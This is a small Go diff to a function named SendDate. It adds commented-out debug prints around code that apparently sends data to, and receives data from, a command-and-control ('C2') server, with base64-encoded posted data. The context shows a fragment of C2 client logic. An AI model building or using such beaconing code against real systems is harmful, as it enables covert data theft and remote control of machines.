@@ -64,6 +64,12 @@ func SendDate(hostPort string, data []byte, url string) {
 		fmt.Printf("connect failed, err : %v\n", err.Error())
 		return
 	}
+	// b64Data, _ := base64.URLEncoding.DecodeString(data)
+	// base64.URLEncoding.EncodeToString()
+	// fmt.Println("Send data to C2:")
+	// fmt.Println("--------------------------------------------------------------")
+	// fmt.Println(string(data))
+	// fmt.Println("--------------------------------------------------------------")
 
 	_, err = conn.Write(data)
 	if err != nil {
@@ -85,6 +91,8 @@ func SendDate(hostPort string, data []byte, url string) {
 			}
 		}
 		if C2data == 0 {
+			// fmt.Println("Get data from C2")
+			// fmt.Println(C2data)
 			fmt.Println("发送的数据")
 			fmt.Println(string(dataBuf))
 			C2Send := []byte("DataType=PostData&Data=TO:SEND" + base64.URLEncoding.EncodeToString(dataBuf))
